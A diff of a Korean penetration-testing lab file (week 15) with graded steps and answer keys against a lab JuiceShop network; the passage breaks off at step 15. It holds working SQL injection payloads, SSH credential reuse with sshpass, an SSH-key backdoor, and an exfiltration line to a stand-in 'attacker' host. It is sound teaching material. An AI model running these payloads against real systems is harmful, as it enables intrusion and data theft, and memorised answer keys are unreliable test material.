@@ -1,218 +1,257 @@
 lab_id: attack-ai-week15
-title: 종합 모의해킹 (Full Pentest) - AI 지원
+title: 종합 모의해킹 (Full Pentest) (AI 지원)
 version: ai
 course: attack-ai
 week: 15
-description: AI 에이전트를 활용하여 전체 모의해킹 라이프사이클을 자동화한다. 정찰부터 보고서 작성까지 AI가 주도적으로 오케스트레이션한다.
+description: 14주 동안 배운 모든 기법을 종합하여 실습 인프라에 대한 완전한 모의해킹을 수행한다. 정찰부터 보고서 작성까지 전체 모의해킹 라이프사이클을 경험한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
-- CCC를 통해 종합 모의해킹 작업을 자동화할 수 있다
-- AI가 종합 모의해킹 결과를 분석하고 보고서를 생성하는 과정을 학습한다
-- 수동 vs AI 기반 종합 모의해킹의 장단점을 이해한다
+- 모의해킹의 전체 단계(Recon -> Scan -> Exploit -> Post-Exploit -> Report)를 독립적으로 수행한다
+- 발견된 취약점을 CVSS로 평가하고 전문적인 보고서를 작성한다
+- 모의해킹 결과를 기반으로 실효적 보안 강화 방안을 제시한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: CCC에 종합 모의해킹 프로젝트를 생성하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 1 - 정찰: 대상 네트워크(10.20.30.0/24)의 활성 호스트를 발견하고, 각 호스트의 열린 포트와 서비스를 식별하라.'
+  hint: nmap -sn으로 호스트 발견 후 -sV로 서비스 탐지를 수행한다
   category: recon
-  points: 5
-  answer: 'curl -s -X POST http://localhost:9100/api/projects -H ''Content-Type: application/json''
-    -H ''X-API-Key: ccc-api-key-2026'' -d ''{"name":"종합_모의해킹","request_text":"종합
-    모의해킹","master_mode":"external"}'''
-  answer_detail: CCC 프로젝트 생성으로 모든 작업의 증적이 자동 기록된다.
-  script: ccc_project_create.py
+  points: 10
+  answer: sudo nmap -sn 10.20.30.0/24 && echo '===== Service Detection =====' && sudo nmap -sV -T4 -p- --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
+  answer_detail: 모의해킹의 첫 단계는 대상 범위(scope) 내 모든 자산을 식별하는 것이다. 호스트 발견 -> 포트 스캔 -> 서비스/버전 탐지 순서로 수행하며, 결과를 체계적으로 기록한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Nmap scan report
     field: stdout
+  script: sudo nmap -sn 10.20.30.0/24 && echo '===== Service Detection =====' && sudo nmap -sV -T4 -p- --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
+  risk_level: low
 - order: 2
-  instruction: AI에게 네트워크 자동 정찰 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
-  category: exploit
+  instruction: 'Phase 1 - 웹 정찰: JuiceShop(10.20.30.80:3000)의 기술 스택, API 엔드포인트, 공개 파일을 수집하라.'
+  hint: whatweb, robots.txt, /ftp, /api 등을 종합적으로 조사한다
+  category: recon
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"네트워크
-    자동 정찰","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 네트워크 자동 정찰 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_네트워크_자동_정찰.py
+  answer: 'echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head -10 && echo ''--- robots.txt ---'' && curl -s http://10.20.30.80:3000/robots.txt && echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp
+    | head -10 && echo ''--- API ---'' && curl -s http://10.20.30.80:3000/api/Products | python3 -c ''import sys,json; print(f"Products: {len(json.load(sys.stdin)["data"])}")'' 2>/dev/null'
+  answer_detail: 웹 정찰에서는 서버 헤더, robots.txt, 디렉토리 리스팅, API 엔드포인트, JavaScript 소스를 모두 분석한다. 수집된 정보의 양과 질이 이후 공격의 성공률을 결정한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Web Recon
     field: stdout
+  script: 'echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head -10 && echo ''--- robots.txt ---'' && curl -s http://10.20.30.80:3000/robots.txt && echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp
+    | head -10 && echo ''--- API ---'' && curl -s http://10.20.30.80:3000/api/Products | python3 -c ''import sys,json; print(f"Products: {len(json.load(sys.stdin)["data"])}")'' 2>/dev/null'
+  risk_level: low
 - order: 3
-  instruction: AI에게 웹 정찰 자동화 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
-  category: exploit
+  instruction: 'Phase 2 - 취약점 스캔: Nikto와 nmap NSE 스크립트로 웹 서버의 취약점을 자동 스캔하라.'
+  hint: nikto -h와 nmap --script vuln을 실행한다
+  category: analysis
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"웹 정찰
-    자동화","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 웹 정찰 자동화 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_웹_정찰_자동화.py
+  answer: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 2>/dev/null | head -30
+  answer_detail: 자동화 스캐너의 결과는 시작점이며, 오탐(false positive)을 수동으로 검증해야 한다. 여러 도구의 결과를 교차 확인하면 탐지율을 높이고 오탐을 줄일 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: Scan
     field: stdout
+  script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 2>/dev/null | head -30
+  risk_level: low
 - order: 4
-  instruction: AI에게 취약점 자동 스캔 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT 토큰을 획득하라.'
+  hint: 이전 week에서 배운 SQLi 기법을 적용한다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"취약점
-    자동 스캔","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 취약점 자동 스캔 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_취약점_자동_스캔.py
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo "Admin token acquired: ${TOKEN:0:50}..." && python3 -c "import base64,json; p=''$TOKEN''.split(''.'')[1]; p+=''=''*(-len(p)%4); d=json.loads(base64.urlsafe_b64decode(p)); print(f''User: {d.get(\"data\",{}).get(\"email\",\"unknown\")}'')"'
+  answer_detail: SQL Injection을 통한 인증 우회는 웹 애플리케이션의 가장 위험한 취약점 중 하나이다. CVSS 9.8(Critical)에 해당하며, 데이터베이스 전체에 대한 접근이 가능할 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: Admin token acquired
     field: stdout
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo "Admin token acquired: ${TOKEN:0:50}..." && python3 -c "import base64,json; p=''$TOKEN''.split(''.'')[1]; p+=''=''*(-len(p)%4); d=json.loads(base64.urlsafe_b64decode(p)); print(f''User: {d.get(\"data\",{}).get(\"email\",\"unknown\")}'')"'
+  risk_level: medium
 - order: 5
-  instruction: AI에게 SQLi 자동 공격 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일, 비밀번호 해시)를 추출하라.'
+  hint: UNION SELECT를 활용하여 Users 테이블의 데이터를 추출한다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"SQLi
-    자동 공격","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 SQLi 자동 공격 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_sqli_자동_공격.py
+  answer: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'' 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin);
+    [print(f\"{p.get(''name'','''')}: {p.get(''description'','''')}\") for p in d.get(''data'',[])]" 2>/dev/null | head -10'
+  answer_detail: UNION SQLi로 Users 테이블의 데이터를 추출하면 모든 사용자의 이메일과 비밀번호 해시를 얻을 수 있다. 실전에서는 이 해시를 오프라인 크래킹하여 평문 비밀번호를 복원한다.
   verify:
     type: output_contains
-    expect: result
+    expect: '@'
     field: stdout
+  script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'' 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin);
+    [print(f\"{p.get(''name'','''')}: {p.get(''description'','''')}\") for p in d.get(''data'',[])]" 2>/dev/null | head -10'
+  risk_level: medium
 - order: 6
-  instruction: AI에게 데이터 자동 추출 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 4 - 측면 이동: web 서버에서 secu 서버(10.20.30.1)로 SSH 접속하라. 자격 증명 재사용을 확인하라.'
+  hint: 동일한 비밀번호로 다른 서버에 접속을 시도한다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"데이터
-    자동 추출","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 데이터 자동 추출 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_데이터_자동_추출.py
+  answer: 'sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "hostname && id" 2>/dev/null'' 2>/dev/null && echo ''=== Lateral movement:
+    web -> secu SUCCESS ==='''
+  answer_detail: 자격 증명 재사용은 실전 모의해킹에서 가장 흔한 측면 이동 벡터이다. 한 시스템에서 획득한 비밀번호로 다른 시스템에 접근할 수 있으면 도메인 전체가 위험하다.
   verify:
     type: output_contains
-    expect: result
+    expect: Lateral movement
     field: stdout
+  script: 'sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 "hostname && id" 2>/dev/null'' 2>/dev/null && echo ''=== Lateral movement:
+    web -> secu SUCCESS ==='''
+  risk_level: medium
 - order: 7
-  instruction: AI에게 측면 이동 자동화 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
-  category: exploit
+  instruction: 'Phase 4 - 권한 정보 수집: web 서버에서 권한 상승 벡터를 열거하라. sudo, SUID, capabilities를 한 번에 검사하라.'
+  hint: sudo -l, find -perm -4000, getcap를 결합한다
+  category: recon
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"측면
-    이동 자동화","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 측면 이동 자동화 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_측면_이동_자동화.py
+  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo "=== sudo ==="; echo 1 | sudo -S -l 2>/dev/null | tail -5; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head
+    -10; echo "=== Capabilities ==="; getcap -r / 2>/dev/null; echo "=== Writable cron ==="; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
+  answer_detail: 권한 상승 열거는 post-exploitation의 핵심이다. sudo, SUID, capabilities, cron, 파일 권한 등 모든 벡터를 체계적으로 검사하여 가장 확실한 권한 상승 경로를 선택한다.
   verify:
     type: output_contains
-    expect: result
+    expect: sudo
     field: stdout
+  script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo "=== sudo ==="; echo 1 | sudo -S -l 2>/dev/null | tail -5; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head
+    -10; echo "=== Capabilities ==="; getcap -r / 2>/dev/null; echo "=== Writable cron ==="; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
+  risk_level: low
 - order: 8
-  instruction: AI에게 권한 상승 열거 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 5 - 지속성: web 서버에 SSH 키 기반 백도어를 설치하라. 비밀번호 변경 후에도 접근이 유지되는지 확인하라.'
+  hint: ssh-keygen으로 키를 생성하고 authorized_keys에 추가한다
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"권한
-    상승 열거","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 권한 상승 열거 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_권한_상승_열거.py
+  answer: 'ssh-keygen -t ed25519 -f /tmp/pentest_key -N '''' -q 2>/dev/null && cat /tmp/pentest_key.pub | sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys''
+    2>/dev/null && ssh -i /tmp/pentest_key -o StrictHostKeyChecking=no web@10.20.30.80 ''echo "Persistence established: $(whoami)@$(hostname)"'' 2>/dev/null'
+  answer_detail: 모의해킹에서 지속성 확보는 실전 APT 공격을 시뮬레이션하는 중요한 단계이다. 그러나 실제 침투 테스트에서는 고객과 합의된 범위 내에서만 수행하고, 테스트 종료 후 반드시 모든 백도어를 제거해야 한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Persistence established
     field: stdout
+  script: 'ssh-keygen -t ed25519 -f /tmp/pentest_key -N '''' -q 2>/dev/null && cat /tmp/pentest_key.pub | sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys''
+    2>/dev/null && ssh -i /tmp/pentest_key -o StrictHostKeyChecking=no web@10.20.30.80 ''echo "Persistence established: $(whoami)@$(hostname)"'' 2>/dev/null'
+  risk_level: medium
 - order: 9
-  instruction: AI에게 지속성 자동 설치 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 5 - 데이터 유출 시뮬레이션: 추출한 사용자 데이터를 암호화하고 외부 전송을 시뮬레이션하라.'
+  hint: 데이터를 암호화하고 전송 명령을 작성한다(실제 전송은 하지 않음)
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"지속성
-    자동 설치","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 지속성 자동 설치 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_지속성_자동_설치.py
+  answer: 'curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/pentest_exfil.txt 2>/dev/null && openssl enc -aes-256-cbc
+    -salt -in /tmp/pentest_exfil.txt -out /tmp/pentest_exfil.enc -pass pass:pentest2026 -pbkdf2 2>/dev/null && echo ''Exfiltration simulation:'' && echo "Data size: $(wc -c < /tmp/pentest_exfil.txt) bytes
+    -> $(wc -c < /tmp/pentest_exfil.enc) bytes (encrypted)" && echo ''Transfer command: curl -X POST -F file=@/tmp/pentest_exfil.enc http://attacker/collect'''
+  answer_detail: 데이터 유출 시뮬레이션은 공격의 최종 단계를 재현한다. 실전에서는 암호화 + 청크 분할 + 정상 채널 위장을 조합한다. 모의해킹에서는 실제 외부 전송은 하지 않고 가능성만 입증한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Exfiltration simulation
     field: stdout
+  script: 'curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/pentest_exfil.txt 2>/dev/null && openssl enc -aes-256-cbc
+    -salt -in /tmp/pentest_exfil.txt -out /tmp/pentest_exfil.enc -pass pass:pentest2026 -pbkdf2 2>/dev/null && echo ''Exfiltration simulation:'' && echo "Data size: $(wc -c < /tmp/pentest_exfil.txt) bytes
+    -> $(wc -c < /tmp/pentest_exfil.enc) bytes (encrypted)" && echo ''Transfer command: curl -X POST -F file=@/tmp/pentest_exfil.enc http://attacker/collect'''
+  risk_level: medium
 - order: 10
-  instruction: AI에게 데이터 유출 시뮬레이션 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
-  category: exploit
+  instruction: 'Phase 6 - 은닉 확인: Suricata와 Wazuh에서 본 모의해킹 활동이 탐지되었는지 확인하라.'
+  hint: secu와 siem 서버의 로그를 확인한다
+  category: analysis
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"데이터
-    유출 시뮬레이션","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 데이터 유출 시뮬레이션 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_데이터_유출_시뮬레이션.py
+  answer: echo '=== Suricata Alerts ===' && sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 'tail -10 /var/log/suricata/fast.log 2>/dev/null' 2>/dev/null && echo '=== Wazuh Alerts ===' && sshpass
+    -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 'tail -10 /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null
+  answer_detail: 모의해킹 후 보안 장비의 탐지 여부를 확인하면 방어 체계의 효과를 평가할 수 있다. 탐지되지 않은 공격은 보안 갭을 의미하며, 탐지된 공격은 방어 체계가 작동하고 있음을 의미한다.
   verify:
     type: output_contains
-    expect: result
+    expect: ===
     field: stdout
+  script: echo '=== Suricata Alerts ===' && sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 'tail -10 /var/log/suricata/fast.log 2>/dev/null' 2>/dev/null && echo '=== Wazuh Alerts ===' && sshpass
+    -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 'tail -10 /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null
+  risk_level: low
 - order: 11
-  instruction: AI에게 탐지 여부 확인 작업을 수행하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
-  category: exploit
+  instruction: 'Phase 7 - 취약점 분류: 발견된 모든 취약점을 CVSS 점수로 평가하고 위험도를 분류하라.'
+  hint: 각 취약점에 CVSS 3.1 벡터 문자열을 할당한다
+  category: analysis
   points: 10
-  answer: 'curl -s -X POST http://localhost:9100/api/projects/{id}/dispatch -H ''Content-Type:
-    application/json'' -H ''X-API-Key: ccc-api-key-2026'' -d ''{"command":"탐지
-    여부 확인","subagent_url":"http://localhost:8002"}'''
-  answer_detail: AI가 탐지 여부 확인 작업을 자동 수행하고 결과를 분석한다.
-  script: ai_탐지_여부_확인.py
+  answer: 'echo -e ''=== Vulnerability Classification ===\n\n| # | Vulnerability | CVSS | Severity | OWASP |\n|---|-------------|------|----------|-------|\n| 1 | SQL Injection (login bypass) | 9.8 | Critical
+    | A03 |\n| 2 | UNION SQLi (data extraction) | 9.1 | Critical | A03 |\n| 3 | User data API exposure | 7.5 | High | A01 |\n| 4 | Credential reuse (SSH) | 8.1 | High | A07 |\n| 5 | Missing rate limiting
+    | 7.3 | High | A07 |\n| 6 | XSS (Reflected) | 6.1 | Medium | A03 |\n| 7 | Directory listing (/ftp) | 5.3 | Medium | A05 |\n| 8 | Missing security headers | 5.0 | Medium | A05 |\n| 9 | Version info disclosure
+    | 5.0 | Medium | A05 |\n| 10 | Verbose error messages | 4.3 | Medium | A05 |'''
+  answer_detail: CVSS(Common Vulnerability Scoring System) 3.1은 취약점의 심각도를 0~10 점수로 표현한다. Critical(9.0-10.0), High(7.0-8.9), Medium(4.0-6.9), Low(0.1-3.9)으로 분류하며, 공격 벡터, 복잡도, 영향도를 종합적으로 고려한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Vulnerability Classification
     field: stdout
+  script: 'echo -e ''=== Vulnerability Classification ===\n\n| # | Vulnerability | CVSS | Severity | OWASP |\n|---|-------------|------|----------|-------|\n| 1 | SQL Injection (login bypass) | 9.8 | Critical
+    | A03 |\n| 2 | UNION SQLi (data extraction) | 9.1 | Critical | A03 |\n| 3 | User data API exposure | 7.5 | High | A01 |\n| 4 | Credential reuse (SSH) | 8.1 | High | A07 |\n| 5 | Missing rate limiting
+    | 7.3 | High | A07 |\n| 6 | XSS (Reflected) | 6.1 | Medium | A03 |\n| 7 | Directory listing (/ftp) | 5.3 | Medium | A05 |\n| 8 | Missing security headers | 5.0 | Medium | A05 |\n| 9 | Version info disclosure
+    | 5.0 | Medium | A05 |\n| 10 | Verbose error messages | 4.3 | Medium | A05 |'''
+  risk_level: low
 - order: 12
-  instruction: AI가 수행한 작업의 evidence summary를 조회하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 7 - 공격 경로 다이어그램: 전체 공격 경로를 텍스트 다이어그램으로 작성하라.'
+  hint: ASCII 아트로 공격 경로를 표현한다
   category: analysis
   points: 10
-  answer: 'curl -s -H ''X-API-Key: ccc-api-key-2026'' http://localhost:9100/api/projects/{id}/evidence/summary'
-  answer_detail: 증적 시스템에서 모든 작업 결과를 조회하여 진행 상황을 파악한다.
-  script: ccc_evidence_summary.py
+  answer: 'echo -e ''=== Attack Path Diagram ===\n\n[Attacker: attacker 10.20.30.201]\n        |\n        | (1) Recon: nmap scan\n        v\n[Web Server: 10.20.30.80]\n   |    |    |\n   |    |    +-- (2)
+    SQLi login bypass -> Admin JWT\n   |    |    +-- (3) UNION SQLi -> User DB dump\n   |    |    +-- (4) XSS -> Session hijack\n   |    |\n   |    +-- (5) SSH cred reuse (password: 1)\n   |              |\n   |              v\n   |    [Secu:
+    10.20.30.1]\n   |         +-- (6) Firewall rules access\n   |         +-- (7) Suricata config access\n   |\n   +-- (5) SSH cred reuse\n              |\n              v\n   [SIEM: 10.20.30.100]\n        +--
+    (8) Wazuh config access\n        +-- (9) Alert log access\n\n[Impact]\n- Full admin access to JuiceShop\n- All user credentials compromised\n- Network infrastructure access\n- Security monitoring bypass
+    possible'''
+  answer_detail: 공격 경로 다이어그램은 모의해킹 보고서의 핵심 요소이다. 각 단계의 입력(사전 조건)과 출력(획득한 접근)을 명확히 하면 경영진도 위험을 직관적으로 이해할 수 있다.
   verify:
     type: output_contains
-    expect: result
+    expect: Attack Path Diagram
     field: stdout
+  script: 'echo -e ''=== Attack Path Diagram ===\n\n[Attacker: attacker 10.20.30.201]\n        |\n        | (1) Recon: nmap scan\n        v\n[Web Server: 10.20.30.80]\n   |    |    |\n   |    |    +-- (2)
+    SQLi login bypass -> Admin JWT\n   |    |    +-- (3) UNION SQLi -> User DB dump\n   |    |    +-- (4) XSS -> Session hijack\n   |    |\n   |    +-- (5) SSH cred reuse (password: 1)\n   |              |\n   |              v\n   |    [Secu:
+    10.20.30.1]\n   |         +-- (6) Firewall rules access\n   |         +-- (7) Suricata config access\n   |\n   +-- (5) SSH cred reuse\n              |\n              v\n   [SIEM: 10.20.30.100]\n        +--
+    (8) Wazuh config access\n        +-- (9) Alert log access\n\n[Impact]\n- Full admin access to JuiceShop\n- All user credentials compromised\n- Network infrastructure access\n- Security monitoring bypass
+    possible'''
+  risk_level: low
 - order: 13
-  instruction: AI에게 종합 모의해킹 결과를 MITRE ATT&CK에 매핑하도록 요청하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 8 - 정리: 모의해킹 중 생성한 모든 아티팩트(백도어 키, 임시 파일)를 정리하라.'
+  hint: 테스트 중 생성한 SSH 키, 임시 파일, 백도어를 제거한다
   category: analysis
   points: 10
-  answer: echo '=== MITRE ATT&CK Mapping for 종합 모의해킹 ==='
-  answer_detail: AI가 수행한 기법을 MITRE ATT&CK 프레임워크에 자동 매핑하여 방어 커버리지를 분석한다.
-  script: ai_attack_mapping.py
+  answer: echo '=== Cleanup ===' && rm -f /tmp/pentest_key /tmp/pentest_key.pub /tmp/pentest_exfil.txt /tmp/pentest_exfil.enc && echo 'Local artifacts removed' && sshpass -p1 ssh -o StrictHostKeyChecking=no
+    web@10.20.30.80 'sed -i "/pentest/d" ~/.ssh/authorized_keys 2>/dev/null; rm -rf /tmp/.hidden_backdoor 2>/dev/null' 2>/dev/null && echo 'Remote backdoors cleaned' && echo 'Cleanup complete'
+  answer_detail: 모의해킹 종료 후 정리(cleanup)는 전문 침투 테스터의 필수 의무이다. 테스트 중 생성한 모든 백도어, 사용자 계정, 임시 파일을 완전히 제거하여 시스템을 원래 상태로 복원해야 한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Cleanup complete
     field: stdout
+  script: echo '=== Cleanup ===' && rm -f /tmp/pentest_key /tmp/pentest_key.pub /tmp/pentest_exfil.txt /tmp/pentest_exfil.enc && echo 'Local artifacts removed' && sshpass -p1 ssh -o StrictHostKeyChecking=no
+    web@10.20.30.80 'sed -i "/pentest/d" ~/.ssh/authorized_keys 2>/dev/null; rm -rf /tmp/.hidden_backdoor 2>/dev/null' 2>/dev/null && echo 'Remote backdoors cleaned' && echo 'Cleanup complete'
+  risk_level: low
 - order: 14
-  instruction: PoW 블록을 조회하여 AI 에이전트의 작업 이력과 보상을 확인하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 8 - 보안 강화 권고: 발견된 취약점에 대한 구체적인 대응 방안을 우선순위별로 작성하라.'
+  hint: Critical -> High -> Medium 순서로 대응 방안을 작성한다
   category: analysis
   points: 15
-  answer: 'curl -s -H ''X-API-Key: ccc-api-key-2026'' ''http://localhost:9100/api/pow/blocks?agent_id=http://localhost:8002'''
-  answer_detail: PoW 시스템으로 AI 에이전트의 작업 증적과 보상을 추적한다.
-  script: ccc_pow_blocks.py
+  answer: echo -e '=== Remediation Recommendations ===\n\n[CRITICAL - 즉시 조치 (1주 이내)]\n1. SQL Injection 수정\n   - Parameterized queries/Prepared statements 적용\n   - ORM 사용 (Sequelize, SQLAlchemy)\n   - WAF
+    rule 추가\n\n2. User API 접근 제어\n   - /api/Users 인증 필수화\n   - 민감 필드(password) 응답에서 제외\n\n[HIGH - 단기 조치 (1개월 이내)]\n3. SSH 비밀번호 정책\n   - 서버별 고유 비밀번호\n   - SSH 키 기반 인증으로 전환\n   - 비밀번호 인증 비활성화\n\n4. Rate Limiting\n   -
+    로그인 API에 rate limit 적용 (5회/분)\n   - 계정 잠금 (10회 실패 후 30분)\n\n[MEDIUM - 중기 조치 (3개월 이내)]\n5. 보안 헤더 추가\n6. 에러 메시지 최소화\n7. 디렉토리 리스팅 비활성화\n8. 정기 취약점 스캔 자동화'
+  answer_detail: 대응 방안은 위험도와 구현 난이도를 고려하여 우선순위를 매겨야 한다. Critical 취약점은 즉시 조치하고, High는 1개월 이내, Medium은 분기 내 해결을 목표로 설정한다.
   verify:
     type: output_contains
-    expect: result
+    expect: Remediation Recommendations
     field: stdout
+  script: echo -e '=== Remediation Recommendations ===\n\n[CRITICAL - 즉시 조치 (1주 이내)]\n1. SQL Injection 수정\n   - Parameterized queries/Prepared statements 적용\n   - ORM 사용 (Sequelize, SQLAlchemy)\n   - WAF
+    rule 추가\n\n2. User API 접근 제어\n   - /api/Users 인증 필수화\n   - 민감 필드(password) 응답에서 제외\n\n[HIGH - 단기 조치 (1개월 이내)]\n3. SSH 비밀번호 정책\n   - 서버별 고유 비밀번호\n   - SSH 키 기반 인증으로 전환\n   - 비밀번호 인증 비활성화\n\n4. Rate Limiting\n   -
+    로그인 API에 rate limit 적용 (5회/분)\n   - 계정 잠금 (10회 실패 후 30분)\n\n[MEDIUM - 중기 조치 (3개월 이내)]\n5. 보안 헤더 추가\n6. 에러 메시지 최소화\n7. 디렉토리 리스팅 비활성화\n8. 정기 취약점 스캔 자동화'
+  risk_level: low
 - order: 15
-  instruction: 종합 모의해킹 완료 보고서를 CCC API로 생성하라.
-  hint: CCC API를 사용하여 종합 모의해킹을 자동화한다
+  instruction: 'Phase 9 - 최종 보고서: 모의해킹 결과를 종합한 Executive Summary를 /tmp/pentest_final_report.txt에 작성하라.'
+  hint: 경영진 요약, 범위, 발견사항, 권고를 포함한다
   category: analysis
-  points: 10
